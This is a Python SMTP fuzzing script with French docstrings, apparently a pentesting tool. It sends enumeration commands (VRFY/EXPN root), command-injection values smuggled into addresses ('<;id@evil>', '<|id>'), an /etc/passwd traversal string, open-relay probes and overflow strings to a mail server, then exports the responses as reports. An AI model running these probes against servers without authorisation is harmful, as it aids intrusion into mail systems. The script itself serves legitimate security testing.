import smtplib
import socket
import datetime
import json
import os

def smtp_fuzz(host, port=25, sender='pentest@local', recipient='test@target', timeout=5):
    """
    Fuzzing avancé d'un service SMTP : commandes non standards, injections, énumération, test open relay.
    Retourne une liste de résultats suspects ou d'anomalies.
    """
    results = []
    meta = {
        'host': host,
        'port': port,
        'sender': sender,
        'recipient': recipient,
        'date': datetime.datetime.now().isoformat()
    }
    commands = [
        'HELO fuzz', 'EHLO fuzz', 'MAIL FROM:<fuzz@local>', 'RCPT TO:<test@target>',
        'VRFY root', 'VRFY admin', 'EXPN users', 'EXPN root', 'RSET', 'NOOP', 'HELP',
        'DATA', 'QUIT', 'STARTTLS', 'AUTH LOGIN', 'AUTH PLAIN', 'AUTH CRAM-MD5',
        'MAIL FROM:<;id@evil>', 'MAIL FROM:<|id@evil>', 'MAIL FROM:<test@evil.com>',
        'RCPT TO:<../../../../etc/passwd>', 'RCPT TO:<|id>', 'RCPT TO:<test@evil.com>',
        'MAIL FROM:<a@a>', 'RCPT TO:<a@a>', 'MAIL FROM:<%s@evil>' % ('A'*500),
        'RCPT TO:<%s@evil>' % ('A'*500)
    ]
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        banner = s.recv(1024).decode(errors='ignore')
        results.append({'command': 'CONNECT', 'response': banner, 'type': 'banner'})
        for cmd in commands:
            try:
                s.sendall((cmd + '\r\n').encode())
                resp = s.recv(1024).decode(errors='ignore')
                if any(x in resp.lower() for x in ['error', 'fail', 'not allowed', 'denied', 'unknown', 'syntax']):
                    results.append({'command': cmd, 'response': resp, 'type': 'error'})
                elif resp and len(resp) > 0:
                    results.append({'command': cmd, 'response': resp, 'type': 'info'})
            except Exception as e:
                results.append({'command': cmd, 'response': str(e), 'type': 'exception'})
        s.close()
    except (socket.error, Exception) as e:
        results.append({'command': 'CONNECT', 'response': str(e), 'type': 'fatal'})
    return {'meta': meta, 'results': results}


def export_smtp_fuzz_results(fuzz_data, export_base):
    """
    Exporte les résultats du fuzzing SMTP au format JSON, Markdown et HTML.
    """
    meta = fuzz_data.get('meta', {})
    results = fuzz_data.get('results', [])
    import os, datetime
    date_dir = datetime.datetime.now().strftime("%Y%m%d")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "fuzz_smtp")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    # JSON
    with open(export_base + '.json', 'w', encoding='utf-8') as f:
        json.dump(fuzz_data, f, ensure_ascii=False, indent=2)
    # Markdown
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport de Fuzzing SMTP\n\n")
        for k, v in meta.items():
            f.write(f"**{k}** : {v}\n")
        f.write(f"\n**Total résultats** : {len(results)}\n\n")
        for i, r in enumerate(results, 1):
            f.write(f"## Commande {i}\n")
            for k, v in r.items():
                f.write(f"- **{k}** : {v}\n")
            f.write("\n")
    # HTML
    with open(export_base + '.html', 'w', encoding='utf-8') as f:
        f.write(f"<html><head><meta charset='utf-8'><title>Rapport Fuzzing SMTP</title></head><body>")
        f.write(f"<h1>Rapport de Fuzzing SMTP</h1>")
        for k, v in meta.items():
            f.write(f"<b>{k}</b> : {v}<br>")
        f.write(f"<br><b>Total résultats :</b> {len(results)}<hr>")
        for i, r in enumerate(results, 1):
            f.write(f"<h2>Commande {i}</h2><ul>")
            for k, v in r.items():
                f.write(f"<li><b>{k}</b> : {v}</li>")
            f.write("</ul><br>")
        f.write("</body></html>")
